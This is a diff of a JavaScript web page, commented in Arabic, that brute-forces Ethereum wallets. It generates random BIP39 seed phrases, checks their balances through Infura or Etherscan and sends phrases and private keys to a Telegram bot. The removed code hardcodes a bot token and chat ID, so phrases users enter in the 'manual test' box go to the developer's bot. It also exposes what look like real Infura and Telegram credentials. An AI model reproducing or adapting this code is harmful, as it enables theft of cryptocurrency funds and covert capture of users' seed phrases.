+            "magic", "magnet", "maid", "mail", "main", "major", "make", "mammal", "man", "manage",
+            "mandate", "mango", "mansion", "manual", "maple", "marble", "march", "margin", "marine", "market",
+            "marriage", "mask", "mass", "master", "match", "material", "math", "matrix", "matter", "maximum",
+            "maze", "meadow", "mean", "measure", "meat", "mechanic", "medal", "media", "melody", "melt",
+            "member", "memory", "mention", "menu", "mercy", "merge", "merit", "merry", "mesh", "message",
+            "metal", "method", "middle", "midnight", "milk", "million", "mimic", "mind", "minimum", "minor",
+            "minute", "miracle", "mirror", "misery", "miss", "mistake", "mix", "mixed", "mixture", "mobile",
+            "model", "modify", "mom", "moment", "monitor", "monkey", "monster", "month", "moon", "moral",
+            "more", "morning", "mosquito", "mother", "motion", "motor", "mountain", "mouse", "move", "movie",
+            "much", "muffin", "mule", "multiply", "muscle", "museum", "mushroom", "music", "must", "mutual",
+            "myself", "mystery", "myth", "naive", "name", "napkin", "narrow", "nasty", "nation", "nature",
+            "near", "neck", "need", "negative", "neglect", "neighbor", "nephew", "nerve", "nest", "net",
+            "network", "neutral", "never", "news", "next", "nice", "night", "noble", "noise", "nominee",
+            "noodle", "normal", "north", "nose", "notable", "note", "nothing", "notice", "novel", "now",
+            "nuclear", "number", "nurse", "nut", "oak", "obey", "object", "oblige", "obscure", "observe",
+            "obtain", "obvious", "occur", "ocean", "october", "odor", "off", "offer", "office", "often",
+            "oil", "okay", "old", "olive", "olympic", "omit", "once", "one", "onion", "online",
+            "only", "open", "opera", "opinion", "oppose", "option", "orange", "orbit", "orchard", "order",
+            "ordinary", "organ", "orient", "original", "orphan", "ostrich", "other", "outdoor", "outer", "output",
+            "outside", "oval", "oven", "over", "own", "owner", "oxygen", "oyster", "ozone", "pact",
+            "paddle", "page", "pair", "palace", "pale", "palm", "panda", "panel", "panic", "panther",
+            "paper", "parade", "parent", "park", "parrot", "part", "party", "pass", "patch", "path",
+            "patient", "patrol", "pattern", "pause", "pave", "payment", "peace", "peanut", "pear", "peasant",
+            "pelican", "pen", "penalty", "pencil", "people", "pepper", "perfect", "permit", "person", "pet",
+            "phone", "photo", "phrase", "physical", "piano", "picnic", "picture", "piece", "pig", "pigeon",
+            "pill", "pilot", "pink", "pioneer", "pipe", "pistol", "pitch", "pizza", "place", "planet",
+            "plastic", "plate", "play", "please", "pledge", "pluck", "plug", "plunge", "poem", "poet",
+            "point", "polar", "pole", "police", "pond", "pony", "pool", "popular", "portion", "position",
+            "possible", "post", "potato", "pottery", "poverty", "powder", "power", "practice", "praise", "predict",
+            "prefer", "prepare", "present", "pretty", "prevent", "price", "pride", "primary", "print", "priority",
+            "prison", "private", "prize", "problem", "process", "produce", "profit", "program", "project", "promote",
+            "proof", "property", "prosper", "protect", "proud", "provide", "public", "pudding", "pull", "pulp",
+            "pulse", "pumpkin", "punch", "pupil", "puppy", "purchase", "purity", "purpose", "purse", "push",
+            "put", "puzzle", "pyramid", "quality", "quantum", "quarter", "question", "quick", "quiet", "quilt",
+            "quit", "quiz", "quote", "rabbit", "raccoon", "race", "rack", "radar", "radio", "rail",
+            "rain", "raise", "rally", "ramp", "ranch", "random", "range", "rapid", "rare", "rate",
+            "rather", "raven", "raw", "razor", "ready", "real", "reason", "rebel", "rebuild", "recall",
+            "receive", "recipe", "record", "recycle", "reduce", "reflect", "reform", "refuse", "region", "regret",
+            "regular", "reject", "relax", "release", "relief", "rely", "remain", "remember", "remind", "remove",
+            "render", "renew", "rent", "reopen", "repair", "repeat", "replace", "report", "require", "rescue",
+            "resemble", "resist", "resource", "response", "result", "retire", "retreat", "return", "reunion", "reveal",
+            "review", "reward", "rhythm", "rib", "ribbon", "rice", "rich", "ride", "ridge", "rifle",
+            "right", "rigid", "ring", "riot", "ripple", "rise", "risk", "ritual", "rival", "river",
+            "road", "roast", "rob", "robot", "robust", "rocket", "romance", "roof", "rookie", "room",
+            "rose", "rotate", "rough", "round", "route", "royal", "rubber", "rude", "rug", "rule",
+            "run", "runway", "rural", "sad", "saddle", "sadness", "safe", "sail", "salad", "salmon",
+            "salon", "salt", "salute", "same", "sample", "sand", "satisfy", "satoshi", "sauce", "sausage",
+            "save", "say", "scale", "scan", "scare", "scatter", "scene", "scheme", "school", "science",
+            "scissors", "scorpion", "scout", "scrap", "screen", "script", "scrub", "sea", "search", "season",
+            "seat", "second", "secret", "section", "security", "seed", "seek", "segment", "select", "sell",
+            "seminar", "senior", "sense", "sentence", "series", "service", "session", "settle", "setup", "seven",
+            "shadow", "shaft", "shallow", "share", "shed", "shell", "sheriff", "shield", "shift", "shine",
+            "ship", "shirt", "shock", "shoe", "shoot", "shop", "short", "shoulder", "shove", "shrimp",
+            "shrug", "shuffle", "shy", "sibling", "sick", "side", "siege", "sight", "sign", "silent",
+            "silk", "silly", "silver", "similar", "simple", "since", "sing", "siren", "sister", "situate",
+            "six", "size", "skate", "sketch", "ski", "skill", "skin", "skirt", "skull", "slab",
+            "slam", "sleep", "slender", "slice", "slide", "slight", "slim", "slogan", "slot", "slow",
+            "slush", "small", "smart", "smile", "smoke", "smooth", "snack", "snake", "snap", "sniff",
+            "snow", "soap", "soccer", "social", "sock", "soda", "soft", "solar", "sold", "soldier",
+            "solid", "solution", "solve", "someone", "song", "soon", "sorry", "sort", "soul", "sound",
+            "soup", "source", "south", "space", "spare", "spatial", "spawn", "speak", "special", "speed",
+            "spell", "spend", "sphere", "spice", "spider", "spike", "spin", "spirit", "split", "spoil",
+            "sponsor", "spoon", "sport", "spot", "spray", "spread", "spring", "spy", "square", "squeeze",
+            "squirrel", "stable", "stadium", "staff", "stage", "stairs", "stamp", "stand", "start", "state",
+            "stay", "steak", "steel", "stem", "step", "stereo", "stick", "still", "sting", "stock",
+            "stomach", "stone", "stool", "story", "stove", "strategy", "street", "strike", "strong", "struggle",
+            "student", "stuff", "stumble", "style", "subject", "submit", "subway", "success", "such", "sudden",
+            "suffer", "sugar", "suggest", "suit", "summer", "sun", "sunny", "sunset", "super", "supply",
+            "supreme", "sure", "surface", "surge", "surprise", "surround", "survey", "suspect", "sustain", "swallow",
+            "swamp", "swap", "swear", "sweet", "swift", "swim", "swing", "switch", "sword", "symbol",
+            "symptom", "syrup", "system", "table", "tackle", "tag", "tail", "talent", "talk", "tank",
+            "tape", "target", "task", "taste", "tattoo", "taxi", "teach", "team", "tell", "ten",
+            "tenant", "tennis", "tent", "term", "test", "text", "thank", "that", "theme", "then",
+            "theory", "there", "they", "thing", "this", "thought", "three", "thrive", "throw", "thumb",
+            "thunder", "ticket", "tide", "tiger", "tilt", "timber", "time", "tiny", "tip", "tired",
+            "tissue", "title", "toast", "tobacco", "today", "toddler", "toe", "together", "toilet", "token",
+            "tomato", "tomorrow", "tone", "tongue", "tonight", "tool", "tooth", "top", "topic", "topple",
+            "torch", "tornado", "tortoise", "toss", "total", "tourist", "toward", "tower", "town", "toy",
+            "track", "trade", "traffic", "tragic", "train", "transfer", "trap", "trash", "travel", "tray",
+            "treat", "tree", "trend", "trial", "tribe", "trick", "trigger", "trim", "trip", "trophy",
+            "trouble", "truck", "true", "truly", "trumpet", "trust", "truth", "try", "tube", "tuition",
+            "tumble", "tuna", "tunnel", "turkey", "turn", "turtle", "twelve", "twenty", "twice", "twin",
+            "twist", "two", "type", "typical", "ugly", "umbrella", "unable", "unaware", "uncle", "uncover",
+            "under", "undo", "unfair", "unfold", "unhappy", "uniform", "unique", "unit", "universe", "unknown",
+            "unlock", "until", "unusual", "unveil", "update", "upgrade", "uphold", "upon", "upper", "upset",
+            "urban", "urge", "usage", "use", "used", "useful", "useless", "usual", "utility", "vacant",
+            "vacuum", "vague", "valid", "valley", "valve", "van", "vanish", "vapor", "various", "vast",
+            "vault", "vehicle", "velvet", "vendor", "venture", "venue", "verb", "verify", "version", "very",
+            "vessel", "veteran", "viable", "vibe", "vicious", "victory", "video", "view", "village", "vintage",
+            "violin", "virtual", "virus", "visa", "visit", "visual", "vital", "vivid", "vocal", "voice",
+            "void", "volcano", "volume", "vote", "voyage", "wage", "wagon", "wait", "walk", "wall",
+            "walnut", "want", "warfare", "warm", "warrior", "wash", "wasp", "waste", "water", "wave",
+            "way", "wealth", "weapon", "wear", "weasel", "weather", "web", "wedding", "weekend", "weird",
+            "welcome", "west", "wet", "what", "wheat", "wheel", "when", "where", "whip", "whisper",
+            "wide", "width", "wife", "wild", "will", "win", "window", "wine", "wing", "wink",
+            "winner", "winter", "wire", "wisdom", "wise", "wish", "witness", "wolf", "woman", "wonder",
+            "wood", "wool", "word", "work", "world", "worry", "worth", "wrap", "wreck", "wrestle",
+            "wrist", "write", "wrong", "yard", "year", "yellow", "you", "young", "youth", "zebra",
             "zero", "zone", "zoo"
         ];
 
-        // إعدادات التطبيق
-        const INFURA_PROJECT_ID = '482a7c1c7cc14ec78699c3f1c231b0cd';
-        const INFURA_URL = `https://mainnet.infura.io/v3/${INFURA_PROJECT_ID}`;
-        const TELEGRAM_BOT_TOKEN = '7521799915:AAEQEM_Ajk5_hMWQUrlmvdNbDBJAUMMwgrg';
-        const TELEGRAM_CHAT_ID = '910021564';
-        const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
-
         // متغيرات العملية
-        let isRunning = false;
+        let isSearching = false;
         let searchInterval = null;
-        let stats = {
-            totalGenerated: 0,
-            activeWallets: 0,
-            emptyWallets: 0,
-            errors: 0
-        };
+        let totalGenerated = 0;
+        let activeWallets = 0;
+        let emptyWallets = 0;
+        let errorCount = 0;
 
         // عناصر DOM
-        const elements = {
-            startBtn: document.getElementById('startBtn'),
-            stopBtn: document.getElementById('stopBtn'),
-            testTelegramBtn: document.getElementById('testTelegramBtn'),
-            clearLogsBtn: document.getElementById('clearLogsBtn'),
-            testManualBtn: document.getElementById('testManualBtn'),
-            manualMnemonic: document.getElementById('manualMnemonic'),
-            manualTestResult: document.getElementById('manualTestResult'),
-            searchSpeed: document.getElementById('searchSpeed'),
-            maxAttempts: document.getElementById('maxAttempts'),
-            totalGenerated: document.getElementById('totalGenerated'),
-            activeWallets: document.getElementById('activeWallets'),
-            emptyWallets: document.getElementById('emptyWallets'),
-            errorCount: document.getElementById('errorCount'),
-            progressFill: document.getElementById('progressFill'),
-            currentStatus: document.getElementById('currentStatus'),
-            logPanel: document.getElementById('logPanel')
-        };
+        const startBtn = document.getElementById('startBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const testTelegramBtn = document.getElementById('testTelegramBtn');
+        const clearLogsBtn = document.getElementById('clearLogsBtn');
+        const testManualBtn = document.getElementById('testManualBtn');
+        const logPanel = document.getElementById('logPanel');
+        const currentStatus = document.getElementById('currentStatus');
+        const progressFill = document.getElementById('progressFill');
 
-        // التحقق من تحميل ethers.js
-        function checkEthersLoaded() {
-            if (typeof ethers === 'undefined') {
-                updateStatus('❌ فشل في تحميل مكتبة ethers.js. يرجى التحقق من اتصال الإنترنت.', 'danger');
-                addLogEntry('❌ فشل في تحميل مكتبة ethers.js', 'error');
-                return false;
+        // إعدادات API
+        const ETHERSCAN_API_BASE = 'https://api.etherscan.io/api';
+
+        // وظائف المساعدة
+        function log(message, type = 'info') {
+            const timestamp = new Date().toLocaleTimeString('ar-EG');
+            const logEntry = document.createElement('div');
+            logEntry.className = `log-entry log-${type}`;
+            logEntry.innerHTML = `<span class="log-timestamp">[${timestamp}]</span> ${message}`;
+            logPanel.appendChild(logEntry);
+            logPanel.scrollTop = logPanel.scrollHeight;
+        }
+
+        function updateStatus(message, type = 'info') {
+            currentStatus.textContent = message;
+            currentStatus.className = `alert alert-${type}`;
+        }
+
+        function updateStats() {
+            document.getElementById('totalGenerated').textContent = totalGenerated;
+            document.getElementById('activeWallets').textContent = activeWallets;
+            document.getElementById('emptyWallets').textContent = emptyWallets;
+            document.getElementById('errorCount').textContent = errorCount;
+            
+            const maxAttempts = parseInt(document.getElementById('maxAttempts').value);
+            if (maxAttempts > 0) {
+                const progress = (totalGenerated / maxAttempts) * 100;
+                progressFill.style.width = `${Math.min(progress, 100)}%`;
             }
-            return true;
         }
 
-        // وظائف توليد العبارات العشوائية
-        function getSecureRandomInt(max) {
-            const array = new Uint32Array(1);
-            window.crypto.getRandomValues(array);
-            return array[0] % max;
-        }
-
-        function generateRandomBIP39Phrase() {
+        // إنشاء عبارة BIP39 عشوائية
+        function generateRandomMnemonic() {
             const words = [];
             for (let i = 0; i < 12; i++) {
-                const randomIndex = getSecureRandomInt(BIP39_WORDLIST.length);
+                const randomIndex = Math.floor(Math.random() * BIP39_WORDLIST.length);
                 words.push(BIP39_WORDLIST[randomIndex]);
             }
             return words.join(' ');
         }
 
-        // وظائف المحفظة
-        async function mnemonicToAddress(mnemonic) {
+        // التحقق من صحة عبارة BIP39
+        function isValidMnemonic(mnemonic) {
             try {
-                if (!checkEthersLoaded()) {
-                    throw new Error('مكتبة ethers.js غير محملة');
-                }
-                
-                // التحقق من صحة العبارة باستخدام ethers
-                if (!ethers.utils.isValidMnemonic(mnemonic)) {
-                    throw new Error('عبارة استرجاع غير صالحة');
-                }
-                
+                // ethers.js تتطلب قائمة الكلمات لتحديد ما إذا كانت العبارة صالحة
+                return ethers.utils.HDNode.isValidMnemonic(mnemonic, BIP39_WORDLIST);
+            } catch (error) {
+                return false;
+            }
+        }
+
+        // إنشاء محفظة من عبارة BIP39
+        function createWalletFromMnemonic(mnemonic) {
+            try {
                 const wallet = ethers.Wallet.fromMnemonic(mnemonic);
-                return wallet.address;
+                return {
+                    address: wallet.address,
+                    privateKey: wallet.privateKey,
+                    mnemonic: mnemonic
+                };
             } catch (error) {
-                console.error('خطأ في تحويل العبارة إلى عنوان:', error);
-                throw error;
+                throw new Error('فشل في إنشاء المحفظة: ' + error.message);
             }
         }
 
+        // التحقق من رصيد المحفظة باستخدام Etherscan API
         async function checkWalletBalance(address) {
-            try {
-                if (!checkEthersLoaded()) {
-                    return null;
-                }
-                
-                const provider = new ethers.providers.JsonRpcProvider(INFURA_URL);
-                const balance = await provider.getBalance(address);
-                const balanceEth = ethers.utils.formatEther(balance);
-                return parseFloat(balanceEth);
-            } catch (error) {
-                console.error('خطأ في التحقق من الرصيد:', error);
-                return null;
+            const apiKey = document.getElementById('etherscanApiKey').value;
+            if (!apiKey) {
+                throw new Error('مفتاح Etherscan API مطلوب');
             }
-        }
 
-        async function getTransactionCount(address) {
             try {
-                if (!checkEthersLoaded()) {
-                    return null;
+                // الحصول على رصيد الإيثر
+                const balanceUrl = `${ETHERSCAN_API_BASE}?module=account&action=balance&address=${address}&tag=latest&apikey=${apiKey}`;
+                const balanceResponse = await fetch(balanceUrl);
+                const balanceData = await balanceResponse.json();
+
+                if (balanceData.status !== '1') {
+                    throw new Error('فشل في الحصول على الرصيد: ' + balanceData.message);
                 }
-                
-                const provider = new ethers.providers.JsonRpcProvider(INFURA_URL);
-                const transactionCount = await provider.getTransactionCount(address);
-                return transactionCount;
-            } catch (error) {
-                console.error('خطأ في الحصول على عدد المعاملات:', error);
-                return null;
-            }
-        }
 
-        async function isWalletActive(address) {
-            try {
-                const balance = await checkWalletBalance(address);
-                const transactionCount = await getTransactionCount(address);
-                
-                const hasBalance = balance !== null && balance > 0;
-                const hasTransactions = transactionCount !== null && transactionCount > 0;
-                
+                const balance = ethers.utils.formatEther(balanceData.result);
+
+                // الحصول على عدد المعاملات (للتأكد من نشاط المحفظة)
+                const txUrl = `${ETHERSCAN_API_BASE}?module=account&action=txlist&address=${address}&startblock=0&endblock=99999999&page=1&offset=1&sort=desc&apikey=${apiKey}`;
+                const txResponse = await fetch(txUrl);
+                const txData = await txResponse.json();
+
+                const transactionCount = (txData.status === '1' && Array.isArray(txData.result)) ? txData.result.length : 0;
+
                 return {
-                    isActive: hasBalance || hasTransactions,
-                    balance: balance,
+                    balance: parseFloat(balance),
                     transactionCount: transactionCount,
-                    hasBalance: hasBalance,
-                    hasTransactions: hasTransactions
+                    isActive: parseFloat(balance) > 0 || transactionCount > 0
                 };
             } catch (error) {
-                console.error('خطأ في التحقق من نشاط المحفظة:', error);
-                return {
-                    isActive: false,
-                    balance: null,
-                    transactionCount: null,
-                    hasBalance: false,
-                    hasTransactions: false,
-                    error: error.message
-                };
+                throw new Error('خطأ في API: ' + error.message);
             }
         }
 
-        // وظائف Telegram
-        async function sendTelegramMessage(message) {
+        // إرسال رسالة إلى Telegram
+        async function sendToTelegram(message) {
+            const botToken = document.getElementById('telegramBotToken').value;
+            const chatId = document.getElementById('telegramChatId').value;
+
+            if (!botToken || !chatId) {
+                throw new Error('رمز البوت ومعرف المحادثة مطلوبان');
+            }
+
             try {
-                const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                const response = await fetch(url, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
                     body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
+                        chat_id: chatId,
                         text: message,
                         parse_mode: 'HTML'
                     })
                 });
-                
+
                 const data = await response.json();
                 if (!data.ok) {
-                    console.error('خطأ في إرسال الرسالة:', data.description);
-                    return false;
+                    throw new Error(data.description || 'فشل في إرسال الرسالة');
                 }
-                
+
                 return true;
             } catch (error) {
-                console.error('خطأ في الاتصال بـ Telegram:', error);
-                return false;
+                throw new Error('خطأ في إرسال Telegram: ' + error.message);
             }
         }
 
-        function formatWalletMessage(mnemonic, address, walletDetails, isActive) {
-            const timestamp = new Date().toLocaleString('ar-EG', {
-                timeZone: 'Africa/Cairo',
-                year: 'numeric',
-                month: '2-digit',
-                day: '2-digit',
-                hour: '2-digit',
-                minute: '2-digit',
-                second: '2-digit'
-            });
-            
-            let message = '';
-            if (isActive) {
-                message = `🎉 <b>تم العثور على محفظة نشطة!</b>\n\n`;
-            } else {
-                message = `📝 <b>عبارة استرجاع جديدة</b>\n\n`;
-            }
-            
-            message += `📝 <b>العبارة:</b>\n<code>${mnemonic}</code>\n\n`;
-            message += `📍 <b>العنوان:</b>\n<code>${address}</code>\n\n`;
-            
-            if (walletDetails.balance !== null) {
-                message += `💰 <b>الرصيد:</b> ${walletDetails.balance.toFixed(6)} ETH\n`;
-            }
-            
-            if (walletDetails.transactionCount !== null) {
-                message += `📊 <b>عدد المعاملات:</b> ${walletDetails.transactionCount}\n`;
-            }
-            
-            if (isActive) {
-                message += `\n✅ <b>الحالة:</b> محفظة نشطة\n`;
-            } else {
-                message += `\n❌ <b>الحالة:</b> محفظة فارغة\n`;
-            }
-            
-            message += `\n⏰ <b>الوقت:</b> ${timestamp}`;
-            return message;
-        }
-
-        async function sendWalletToTelegram(mnemonic, address, walletDetails, isActive) {
+        // معالجة محفظة واحدة
+        async function processWallet(mnemonic) {
             try {
-                const message = formatWalletMessage(mnemonic, address, walletDetails, isActive);
-                return await sendTelegramMessage(message);
-            } catch (error) {
-                console.error('خطأ في إرسال المحفظة:', error);
-                return false;
-            }
-        }
+                const wallet = createWalletFromMnemonic(mnemonic);
+                log(`تم إنشاء محفظة: ${wallet.address}`, 'info');
 
-        // وظائف السجل
-        function addLogEntry(message, type = 'info') {
-            const timestamp = new Date().toLocaleTimeString('ar-EG');
-            const logEntry = document.createElement('div');
-            logEntry.className = `log-entry log-${type}`;
-            logEntry.innerHTML = `<span class="log-timestamp">[${timestamp}]</span> ${message}`;
-            
-            elements.logPanel.appendChild(logEntry);
-            elements.logPanel.scrollTop = elements.logPanel.scrollHeight;
-        }
+                const balanceInfo = await checkWalletBalance(wallet.address);
+                
+                if (balanceInfo.isActive) {
+                    activeWallets++;
+                    const message = `🎉 تم العثور على محفظة نشطة!\n\n` +
+                                  `📍 العنوان: ${wallet.address}\n` +
+                                  `💰 الرصيد: ${balanceInfo.balance} ETH\n` +
+                                  `📊 عدد المعاملات: ${balanceInfo.transactionCount}\n` +
+                                  `🔑 العبارة: ${mnemonic}\n` +
+                                  `🔐 المفتاح الخاص: ${wallet.privateKey}`;
 
-        // وظائف تحديث الواجهة
-        function updateStats() {
-            elements.totalGenerated.textContent = stats.totalGenerated;
-            elements.activeWallets.textContent = stats.activeWallets;
-            elements.emptyWallets.textContent = stats.emptyWallets;
-            elements.errorCount.textContent = stats.errors;
-            
-            const maxAttempts = parseInt(elements.maxAttempts.value) || 0;
-            if (maxAttempts > 0) {
-                const progress = (stats.totalGenerated / maxAttempts) * 100;
-                elements.progressFill.style.width = `${Math.min(progress, 100)}%`;
-            }
-        }
-
-        function updateStatus(message, type = 'info') {
-            elements.currentStatus.textContent = message;
-            elements.currentStatus.className = `alert alert-${type}`;
-        }
-
-        // الوظيفة الرئيسية للبحث
-        async function searchForActiveWallets() {
-            try {
-                if (!checkEthersLoaded()) {
-                    stats.errors++;
-                    updateStats();
-                    return;
-                }
-
-                // توليد عبارة عشوائية
-                const mnemonic = generateRandomBIP39Phrase();
-                stats.totalGenerated++;
-                
-                updateStatus(`جاري فحص العبارة رقم ${stats.totalGenerated}...`, 'info');
-                addLogEntry(`تم توليد عبارة جديدة: ${mnemonic.substring(0, 30)}...`);
-                
-                // تحويل العبارة إلى عنوان
-                const address = await mnemonicToAddress(mnemonic);
-                
-                if (!address) {
-                    stats.errors++;
-                    addLogEntry('خطأ في تحويل العبارة إلى عنوان', 'error');
-                    updateStats();
-                    return;
-                }
-                
-                // فحص نشاط المحفظة
-                const walletStatus = await isWalletActive(address);
-                
-                // إرسال جميع العبارات إلى Telegram سواء كانت نشطة أو فارغة
-                const telegramSent = await sendWalletToTelegram(mnemonic, address, walletStatus, walletStatus.isActive);
-                
-                if (walletStatus.isActive) {
-                    stats.activeWallets++;
-                    addLogEntry(`🎉 تم العثور على محفظة نشطة! العنوان: ${address}`, 'success');
+                    log(`محفظة نشطة! الرصيد: ${balanceInfo.balance} ETH`, 'success');
                     
-                    if (telegramSent) {
-                        addLogEntry('✅ تم إرسال المحفظة النشطة إلى Telegram بنجاح', 'success');
-                    } else {
-                        addLogEntry('❌ فشل في إرسال المحفظة النشطة إلى Telegram', 'error');
-                    }
-                    
-                    updateStatus(`تم العثور على محفظة نشطة! إجمالي المحافظ النشطة: ${stats.activeWallets}`, 'success');
-                } else {
-                    stats.emptyWallets++;
-                    addLogEntry(`محفظة فارغة: ${address.substring(0, 20)}...`);
-                    
-                    if (telegramSent) {
-                        addLogEntry('✅ تم إرسال المحفظة الفارغة إلى Telegram بنجاح', 'info');
-                    } else {
-                        addLogEntry('❌ فشل في إرسال المحفظة الفارغة إلى Telegram', 'error');
-                    }
-                }
-                
-                updateStats();
-                
-                // التحقق من الحد الأقصى للمحاولات
-                const maxAttempts = parseInt(elements.maxAttempts.value) || 0;
-                if (maxAttempts > 0 && stats.totalGenerated >= maxAttempts) {
-                    stopSearch();
-                    updateStatus(`تم الوصول للحد الأقصى من المحاولات (${maxAttempts})`, 'warning');
-                    addLogEntry(`تم إيقاف البحث - وصل للحد الأقصى: ${maxAttempts} محاولة`, 'info');
-                }
-                
-            } catch (error) {
-                stats.errors++;
-                addLogEntry(`خطأ في العملية: ${error.message}`, 'error');
-                updateStats();
-            }
-        }
-
-        // وظائف اختبار العبارات يدويًا
-        async function testManualMnemonic() {
-            const mnemonic = elements.manualMnemonic.value.trim();
-            
-            if (!mnemonic) {
-                updateStatus('يرجى إدخال عبارة BIP39 للفحص', 'warning');
-                return;
-            }
-            
-            try {
-                if (!checkEthersLoaded()) {
-                    return;
-                }
-
-                updateStatus('جاري فحص العبارة...', 'info');
-                addLogEntry(`🔍 جاري فحص العبارة يدويًا: ${mnemonic}`);
-                
-                // إظهار مؤشر التحميل
-                elements.testManualBtn.innerHTML = '<span class="loading-spinner"></span> جاري الفحص...';
-                elements.testManualBtn.disabled = true;
-                
-                const address = await mnemonicToAddress(mnemonic);
-                
-                addLogEntry(`✅ تم تحويل العبارة إلى العنوان: ${address}`);
-                
-                const walletStatus = await isWalletActive(address);
-                
-                // تحديث واجهة نتائج الاختبار
-                updateManualTestResult(mnemonic, address, walletStatus);
-                
-                // إرسال العبارة إلى Telegram سواء كانت نشطة أو فارغة
-                const telegramSent = await sendWalletToTelegram(mnemonic, address, walletStatus, walletStatus.isActive);
-                
-                // إضافة سجل
-                if (walletStatus.isActive) {
-                    addLogEntry(`🎉 العبارة تفتح محفظة نشطة! العنوان: ${address}`, 'success');
-                    updateStatus('🎉 العبارة تفتح محفظة نشطة!', 'success');
-                    
-                    if (telegramSent) {
-                        addLogEntry('✅ تم إرسال المحفظة النشطة إلى Telegram بنجاح', 'success');
-                    } else {
-                        addLogEntry('❌ فشل في إرسال المحفظة النشطة إلى Telegram', 'error');
+                    try {
+                        await sendToTelegram(message);
+                        log('تم إرسال المحفظة إلى Telegram بنجاح', 'success');
+                    } catch (telegramError) {
+                        log(`فشل في إرسال Telegram: ${telegramError.message}`, 'error');
                     }
                 } else {
-                    addLogEntry(`❌ العبارة تفتح محفظة فارغة: ${address}`, 'info');
-                    updateStatus('❌ العبارة تفتح محفظة فارغة', 'info');
-                    
-                    if (telegramSent) {
-                        addLogEntry('✅ تم إرسال المحفظة الفارغة إلى Telegram بنجاح', 'info');
-                    } else {
-                        addLogEntry('❌ فشل في إرسال المحفظة الفارغة إلى Telegram', 'error');
-                    }
+                    emptyWallets++;
+                    log(`محفظة فارغة: ${wallet.address}`, 'info');
                 }
-                
-                // إعادة تعيين الزر
-                elements.testManualBtn.innerHTML = '<span>🔍 فحص العبارة</span>';
-                elements.testManualBtn.disabled = false;
-                
+
+                return balanceInfo;
             } catch (error) {
-                updateStatus(`❌ خطأ في فحص العبارة: ${error.message}`, 'danger');
-                addLogEntry(`❌ خطأ في فحص العبارة: ${error.message}`, 'error');
-                elements.testManualBtn.innerHTML = '<span>🔍 فحص العبارة</span>';
-                elements.testManualBtn.disabled = false;
+                errorCount++;
+                log(`خطأ في معالجة المحفظة: ${error.message}`, 'error');
+                throw error;
             }
         }
 
-        function updateManualTestResult(mnemonic, address, walletStatus) {
-            let resultHTML = '';
-            
-            if (walletStatus.isActive) {
-                resultHTML = `
-                    <h4>✅ نتيجة الفحص: المحفظة نشطة</h4>
-                    <div class="status active">محفظة نشطة</div>
-                    <div class="balance ${walletStatus.balance > 0 ? 'positive' : 'zero'}">
-                        💰 الرصيد: ${walletStatus.balance !== null ? walletStatus.balance.toFixed(6) + ' ETH' : 'غير معروف'}
-                    </div>
-                    <div class="transactions">
-                        📊 عدد المعاملات: ${walletStatus.transactionCount !== null ? walletStatus.transactionCount : 'غير معروف'}
-                    </div>
-                    <div class="wallet-details">
-                        <div class="mnemonic">📝 العبارة: ${mnemonic}</div>
-                        <div class="address">📍 العنوان: ${address}</div>
-                    </div>
-                `;
-                elements.manualTestResult.className = 'test-result active';
-            } else {
-                resultHTML = `
-                    <h4>❌ نتيجة الفحص: المحفظة فارغة</h4>
-                    <div class="status inactive">محفظة فارغة</div>
-                    <div class="balance zero">
-                        💰 الرصيد: ${walletStatus.balance !== null ? walletStatus.balance.toFixed(6) + ' ETH' : 'غير معروف'}
-                    </div>
-                    <div class="transactions">
-                        📊 عدد المعاملات: ${walletStatus.transactionCount !== null ? walletStatus.transactionCount : 'غير معروف'}
-                    </div>
-                    <div class="wallet-details">
-                        <div class="mnemonic">📝 العبارة: ${mnemonic}</div>
-                        <div class="address">📍 العنوان: ${address}</div>
-                    </div>
-                `;
-                elements.manualTestResult.className = 'test-result inactive';
-            }
-            
-            elements.manualTestResult.innerHTML = resultHTML;
-            elements.manualTestResult.style.display = 'block';
-        }
-
-        // وظائف التحكم
+        // بدء البحث
         async function startSearch() {
-            if (isRunning) return;
-            
-            if (!checkEthersLoaded()) {
+            if (isSearching) return;
+
+            const apiKey = document.getElementById('etherscanApiKey').value;
+            if (!apiKey) {
+                alert('يرجى إدخال مفتاح Etherscan API');
                 return;
             }
-            
-            isRunning = true;
-            elements.startBtn.disabled = true;
-            elements.stopBtn.disabled = false;
-            
-            const speed = parseInt(elements.searchSpeed.value) || 2000;
-            
-            updateStatus('جاري بدء البحث...', 'info');
-            addLogEntry('🚀 تم بدء البحث عن المحافظ النشطة');
-            
-            // إرسال رسالة البداية إلى Telegram
-            const startMessage = `🚀 <b>بدء عملية البحث عن المحافظ النشطة</b>\n\n⏰ الوقت: ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}\n🔍 جاري البحث عن محافظ وإرسال جميع العبارات إلى Telegram...`;
-            await sendTelegramMessage(startMessage);
-            
-            searchInterval = setInterval(searchForActiveWallets, speed);
+
+            isSearching = true;
+            startBtn.disabled = true;
+            stopBtn.disabled = false;
+
+            const searchSpeed = parseInt(document.getElementById('searchSpeed').value);
+            const maxAttempts = parseInt(document.getElementById('maxAttempts').value);
+
+            log('بدء البحث عن المحافظ النشطة...', 'info');
+            updateStatus('جاري البحث...', 'info');
+
+            searchInterval = setInterval(async () => {
+                if (!isSearching) return;
+
+                if (maxAttempts > 0 && totalGenerated >= maxAttempts) {
+                    stopSearch();
+                    return;
+                }
+
+                try {
+                    const mnemonic = generateRandomMnemonic();
+                    
+                    // التحقق من صحة العبارة قبل محاولة إنشاء المحفظة
+                    if (!isValidMnemonic(mnemonic)) {
+                        log('عبارة BIP39 غير صالحة تم إنشاؤها، جاري المحاولة مرة أخرى...', 'error');
+                        return;
+                    }
+
+                    totalGenerated++;
+                    updateStats();
+
+                    await processWallet(mnemonic);
+                } catch (error) {
+                    log(`خطأ في العملية: ${error.message}`, 'error');
+                }
+            }, searchSpeed);
         }
 
-        async function stopSearch() {
-            if (!isRunning) return;
-            
-            isRunning = false;
-            elements.startBtn.disabled = false;
-            elements.stopBtn.disabled = true;
-            
+        // إيقاف البحث
+        function stopSearch() {
+            isSearching = false;
             if (searchInterval) {
                 clearInterval(searchInterval);
